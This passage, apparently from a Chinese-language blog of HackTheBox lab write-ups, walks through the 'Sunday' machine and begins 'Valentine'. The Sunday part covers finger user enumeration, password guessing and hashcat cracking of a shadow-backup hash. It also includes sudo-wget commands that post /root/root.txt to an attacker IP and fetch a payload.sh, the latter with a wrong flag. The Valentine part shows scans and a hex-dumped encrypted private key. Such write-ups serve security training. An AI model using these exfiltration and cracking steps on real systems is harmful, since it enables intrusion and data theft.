1720/tcp)\nHOP RTT       ADDRESS\n1   142.34 ms 10.10.14.1\n2   142.67 ms 10.10.10.76\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 498.43 seconds\n```\n79 端口有一个 finger?，最后一个字母是啥就不知道了去搜搜看有没有漏洞\n\n## Searchsploit\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit finger\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nBSD 4.2 - 'fingerd' Remote Buffer Overflow                                                                                                                                        | bsd/remote/19039.txt\ncfingerd 1.4 - Format String (1)                                                                                                                                                  | linux/remote/20748.pl\ncfingerd 1.4 - Format String (2)                                                                                                                                                  | linux/remote/20749.c\ncfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (1)                                                                                                                  | unix/local/20962.pl\ncfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (2)                                                                                                                  | unix/local/20963.c\ncfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (3)                                                                                                                  | unix/local/20964.c\nDaniel Beckham The Finger Server 0.82 Beta - Pipe                                                                                                                                 | cgi/remote/19745.txt\nFingerTec Fingerprint Reader - Remote Access and Remote Enrolment                                                                                                                 | hardware/remote/39227.txt\nGNU Ffingerd 1.19 - 'Username' Validity Disclosure                                                                                                                                | unix/remote/20327.txt\nGranding MA300 - Traffic Sniffing Man In The Middle Fingerprint PIN Disclosure                                                                                                    | multiple/remote/39292.pl\nMartin Schulze Cfingerd 1.4.2 - GECOS Buffer Overflow                                                                                                                             | freebsd/local/19504.c\nMorris Worm - fingerd Stack Buffer Overflow (Metasploit)                                                                                                                          | bsd/remote/45791.rb\nOpenVms 8.3 Finger Service - Stack Buffer Overflow                                                                                                                                | multiple/dos/32193.txt\nSDFingerD 1.1 - Failure To Drop Privileges Privilege Escalation                                                                                                                   | linux/local/22806.sh\nWindows TCPIP Finger Command - C2 Channel and Bypassing Security Software                                                                                                         | windows/local/48815.txt\nzkfingerd 0.9.1 - 'say()' Format String                                                                                                                                           | linux/remote/22101.c\nzkfingerd SysLog 0.9.1 - Format String                                                                                                                                            | linux/remote/22091.c\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Paper Title                                                                                                                                                                      |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nAddress Relay Fingerprinting (How to Use Often Discarded Bugs)                                                                                                                    | english/13193-address-relay-fing\nAutomated Web Application Fingerprinting                                                                                                                                          | docs/english/17538-automated-web\nBitter Harvest: Systematically Fingerprinting Low- and Medium-interaction Honeypots at Internet Scale                                                                             | docs/english/45365-bitter-harves\n[Portuguese] Web Apps Fingerprinting                                                                                                                                              | portuguese/13683-[portuguese]-we\n[Spanish] El fingerprinting dentro de la seguridad web                                                                                                                            | docs/spanish/18421-[spanish]-el-\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n```\n搜出来的结果不少，首先排除掉 cfingerd 以及其他的干扰，就剩下了一个 Morris Worm - fingerd Stack Buffer Overflow (Metasploit)\n\n去尝试一下\n\n## Metasploit\n```bash\nmsf6 > search fingerd\n\nMatching Modules\n================\n\n   #  Name                                   Disclosure Date  Rank    Check  Description\n   -  ----                                   ---------------  ----    -----  -----------\n   0  exploit/bsd/finger/morris_fingerd_bof  1988-11-02       normal  Yes    Morris Worm fingerd Stack Buffer Overflow\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/bsd/finger/morris_fingerd_bof\n\nmsf6 > use 0\n[*] Using configured payload bsd/vax/shell_reverse_tcp\n```\n去设置一下配置\n\n```bash\nmsf6 exploit(bsd/finger/morris_fingerd_bof) > show options \n\nModule options (exploit/bsd/finger/morris_fingerd_bof):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS  10.10.10.76      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT   79               yes       The target port (TCP)\n\nPayload options (bsd/vax/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.14.7       yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   @(#)fingerd.c   5.1 (Berkeley) 6/6/85\n```\n然后去执行\n\n```bash\nmsf6 exploit(bsd/finger/morris_fingerd_bof) > exploit \n\n[-] 10.10.10.76:79 - Exploit failed: bsd/vax/shell_reverse_tcp: All encoders failed to encode.\n[*] Exploit completed, but no session was created.\n```\n这边是失败了，我们去看看有没有其他脚本\n\n```bash\nmsf6 exploit(bsd/finger/morris_fingerd_bof) > search finger\n\nMatching Modules\n================\n\n   #   Name                                            Disclosure Date  Rank    Check  Description\n   -   ----                                            ---------------  ----    -----  -----------\n   0   exploit/windows/rdp/cve_2019_0708_bluekeep_rce  2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free\n   1   auxiliary/scanner/finger/finger_users                            normal  No     Finger Service User Enumerator\n   2   auxiliary/server/browser_autopwn                                 normal  No     HTTP Client Automatic Exploiter\n   3   exploit/bsd/finger/morris_fingerd_bof           1988-11-02       normal  Yes    Morris Worm fingerd Stack Buffer Overflow\n   4   auxiliary/gather/mybb_db_fingerprint            2014-02-13       normal  Yes    MyBB Database Fingerprint\n   5   exploit/windows/http/bea_weblogic_post_bof      2008-07-17       great   Yes    Oracle Weblogic Apache Connector POST Request Buffer Overflow\n   6   auxiliary/scanner/oracle/isqlplus_login                          normal  No     Oracle iSQL*Plus Login Utility\n   7   auxiliary/scanner/oracle/isqlplus_sidbrute                       normal  No     Oracle iSQLPlus SID Check\n   8   post/windows/gather/enum_putty_saved_sessions                    normal  No     PuTTY Saved Sessions Enumeration Module\n   9   auxiliary/scanner/smb/smb_version                                normal  No     SMB Version Detection\n   10  auxiliary/scanner/vmware/esx_fingerprint                         normal  No     VMWare ESX/ESXi Fingerprint Scanner\n\nInteract with a module by name or index. For example info 10, use 10 or use auxiliary/scanner/vmware/esx_fingerprint\n```\n这里有一个扫描用户名的 auxiliary/scanner/finger/finger\\_users，去尝试一下\n\n```bash\nmsf6 auxiliary(scanner/finger/finger_users) > show options \n\nModule options (auxiliary/scanner/finger/finger_users):\n\n   Name        Current Setting                                                Required  Description\n   ----        ---------------                                                --------  -----------\n   RHOSTS      10.10.10.76                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT       79                                                             yes       The target port (TCP)\n   THREADS     1                                                              yes       The number of concurrent threads (max one per host)\n   USERS_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of default UNIX accounts.\n```\n```bash\nmsf6 auxiliary(scanner/finger/finger_users) > exploit \n\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: adm\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: ikeuser\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: lp\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dladm\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: netadm\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: netcfg\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dhcpserv\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: bin\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: daemon\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: ftp\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: noaccess\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody4\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: root\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sshd\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sys\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: aiuser\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: openldap\n[+] 10.10.10.76:79        - 10.10.10.76:79 Users found: adm, aiuser, bin, daemon, dhcpserv, dladm, ftp, ikeuser, lp, netadm, netcfg, noaccess, nobody, nobody4, openldap, root, sshd, sys\n[*] 10.10.10.76:79        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n# 漏洞利用\n这个似乎不好用，我去找到了一个脚本\n\n> [https://github.com/pentestmonkey/finger-user-enum.git](https://github.com/pentestmonkey/finger-user-enum.git)\n\n然后再执行试试\n\n```bash\n./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76 | less -S\n\nStarting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )\n\n ----------------------------------------------------------\n|                   Scan Information                       |\n ----------------------------------------------------------\n\nWorker Processes ......... 5\nUsernames file ........... /usr/share/seclists/Usernames/Names/names.txt\nTarget count ............. 1\nUsername count ........... 10177\nTarget TCP port .......... 79\nQuery timeout ............ 5 secs\nRelay Server ............. Not used\n\n######## Scan started at Thu Apr 14 01:51:49 2022 #########\naccess@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..\nadmin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm>\nbin@10.10.10.76: bin             ???                         < .  .  .  . >..\ndee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..\nike@10.10.10.76: ikeuser  IKE Admin                          < .  .  .  . >..\njo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..\nla verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..\nline@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..\nmessage@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..\nmiof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..\nroot@10.10.10.76: root     Super-User            console      <Dec 19 10:30>..\nsammy@10.10.10.76: sammy           ???            console      <Dec 19 08:35>..\nsunny@10.10.10.76: sunny           ???            console      <Dec 19 09:56>..\nsys@10.10.10.76: sys             ???                         < .  .  .  . >..\nzsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..\n######## Scan completed at Thu Apr 14 02:29:46 2022 #########\n15 results.\n\n10177 queries in 2277 seconds (4.5 queries / sec)\n```\n这里有三个用户不一样，都有登录信息。分别是 root、sammy、sunny\n\n根据靶机图像和名字判断，账户应该是 sunny，密码可能是 sunday\n\n```bash\n┌──(root💀lucifiel)-[/home/lucifiel/Desktop]\n└─# ssh -p 22022 sunny@10.10.10.76\nThe authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.\nED25519 key fingerprint is SHA256:t3OPHhtGi4xT7FTt3pgi5hSIsfljwBsZAUOPVy8QyXc.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '[10.10.10.76]:22022' (ED25519) to the list of known hosts.\nPassword:\nWarning: 4 failed authentication attempts since last successful authentication.  The latest at Thu Apr 14 06:59 2022.\nLast login: Sun Dec 19 09:56:51 2021 on console\nOracle Corporation      SunOS 5.11      11.4    Aug 2018\nsunny@sunday:~$ whoami&&id\nsunny\nuid=101(sunny) gid=10(staff)\n```\n成功进入 user 权限\n\n```bash\nsunny@sunday:/home/sammy$ cat user.txt\na3d9498027ca5187ba1793943ee8a598\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n```bash\nsunny@sunday:/home/sammy$ sudo -l\n用户 sunny 可以在 sunday 上运行以下命令：\n    (root) NOPASSWD: /root/troll\n```\n使用 sudo -l 查看了一下权限，发现可以使用 root 权限运行 /root/troll\n\n运行一下看看\n\n```bash\nsunny@sunday:/home/sammy$ sudo /root/troll\nsudo: /root/troll：找不到命令\n```\n提示找不到？那找找其他路子\n\n```bash\nsunny@sunday:/backup$ ls\nagent22.backup  shadow.backup\nsunny@sunday:/backup$ cat shadow.backup\nmysql:NP:::::::\nopenldap:*LK*:::::::\nwebservd:*LK*:::::::\npostgres:NP:::::::\nsvctag:*LK*:6445::::::\nnobody:*LK*:6445::::::\nnoaccess:*LK*:6445::::::\nnobody4:*LK*:6445::::::\nsammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::\nsunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::\n```\n在目录 /backup 中找到了一个 shadow.backup 的文件，拿到了一串hash，去尝试爆破一下\n\n```bash\necho $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB > hash\n```\n然后开始爆破\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# hashcat -m 7400 hash /usr/share/wordlists/rockyou.txt \nhashcat (v6.1.1) starting...\n\nOpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n=============================================================================================================================\n* Device #1: pthread-Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, 2878/2942 MB (1024 MB allocatable), 4MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers applied:\n* Zero-Byte\n* Single-Hash\n* Single-Salt\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nUsing pure kernels enables cracking longer passwords but for the price of drastically reduced performance.\nIf you want to switch to optimized backend kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n\nHost memory required for this attack: 65 MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\n$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: sha256crypt $5$, SHA256 (Unix)\nHash.Target......: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB\nTime.Started.....: Thu Apr 14 21:29:17 2022 (2 mins, 59 secs)\nTime.Estimated...: Thu Apr 14 21:32:16 2022 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:     1145 H/s (13.57ms) @ Accel:128 Loops:128 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 203776/14344385 (1.42%)\nRejected.........: 0/203776 (0.00%)\nRestore.Point....: 203264/14344385 (1.42%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000\nCandidates.#1....: dadof3 -> chs2009\n\nStarted: Thu Apr 14 21:28:48 2022\nStopped: Thu Apr 14 21:32:17 2022\n```\n得到了密码\n\n```bash\nusername = sammy\npassword = cooldude!\n```\n去登录一下\n\n```bash\nsunny@sunday:~$ su sammy\nPassword:\nsammy@sunday:~$ whoami&&id\nsammy\nuid=100(sammy) gid=10(staff)\n```\n```bash\nsammy@sunday:~$ sudo -l\n用户 sammy 可以在 sunday 上运行以下命令：\n    (ALL) ALL\n    (root) NOPASSWD: /usr/bin/wget\n```\n使用 sudo -l 查看一下权限，发现可以使用 root 权限运行 wget，那就好办了 有方案了\n\n然后使用 wget 的 --post-file 拿我们要的文件\n\n```bash\nsudo wget --post-file=/root/root.txt 10.10.14.2\n```\n```bash\nsudo wget http://10.10.14.7/payload.sh -o /root/troll\n```\n然后回到 sunny 用户，使用 sudo /root/troll 执行\n\n```bash\nsudo /root/troll\n```\n使用 nc 监听一个端口后，再执行这条命令\n\n```bash\nnc -nvlp 80\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 80\nlistening on [any] 80 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.76] 59151\nPOST / HTTP/1.1\nUser-Agent: Wget/1.19.5 (solaris2.11)\nAccept: */*\nAccept-Encoding: identity\nHost: 10.10.14.2\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 33\n\nfb40fab61d99d37536daeec0d97af9b8\n```\n成功获得 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Valentine - Hackthebox","url":"/2022/04/12/Hackthebox/Easy/Hackthebox-Valentine/","content":"\n# Hackthebox - Valentine\n# 靶场信息\n![](Hackthebox-Valentine/05a3804f-8e5b-4deb-9d41-f8a8347b588e.png)\n\n# 靶场类型\n![](Hackthebox-Valentine/c3466ca0-b507-40ca-a056-5705ce54b48d.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀lucifiel)-[/home/lucifiel]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.79\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-12 14:15 CST\nNmap scan report for 10.10.10.79\nHost is up (0.14s latency).\nNot shown: 65532 closed ports\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)\n|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)\n|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)\n80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))\n|_http-server-header: Apache/2.2.22 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))\n|_http-server-header: Apache/2.2.22 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US\n| Not valid before: 2018-02-06T00:45:25\n|_Not valid after:  2019-02-06T00:45:25\n|_ssl-date: 2022-04-12T06:19:55+00:00; +3m16s from scanner time.\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/12%OT=22%CT=1%CU=37713%PV=Y%DS=2%DC=T%G=Y%TM=6255194\nOS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OPS\nOS:(O1=M505ST11NW4%O2=M505ST11NW4%O3=M505NNT11NW4%O4=M505ST11NW4%O5=M505ST1\nOS:1NW4%O6=M505ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN\nOS:(R=Y%DF=Y%T=40%W=3908%O=M505NNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M505ST11NW4%RD=\nOS:0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=\nOS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R\nOS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: 3m15s\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT       ADDRESS\n1   140.62 ms 10.10.14.1\n2   140.81 ms 10.10.10.79\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 47.93 seconds\n```\n## Http\n![](Hackthebox-Valentine/9fb744bf-5412-42e0-9c4b-20a003bc68c4.png)\n\n没看到有什么特别的，去做个 fuzz\n\n## Fuzz\n```bash\n┌──(root💀lucifiel)-[/home/lucifiel]\n└─# gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.79/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/12 14:23:09 Starting gobuster in directory enumeration mode\n===============================================================\n/index                (Status: 200) [Size: 38]\n/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]\n/encode               (Status: 200) [Size: 554]\n/decode               (Status: 200) [Size: 552]\n/omg                  (Status: 200) [Size: 153356]\n/server-status        (Status: 403) [Size: 292]\n\n===============================================================\n2022/04/12 14:26:56 Finished\n===============================================================\n```\n这里有一个 /dev 目录，去查看一下\n\n![](Hackthebox-Valentine/b621df23-2c29-4590-9899-4f019ce1880c.png)\n\n/dev 中有两个文件 hype\\_key 和 notes.txt\n\n去分别查看一下\n\n```bash\nnotes.txt\n\nTo do:\n\n1) Coffee.\n2) Research.\n3) Fix decoder/encoder before going live.\n4) Make sure encoding/decoding is only done client-side.\n5) Don't use the decoder/encoder until any of this is done.\n6) Find a better way to take notes.\n```\n```bash\nhype_key\n\n2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 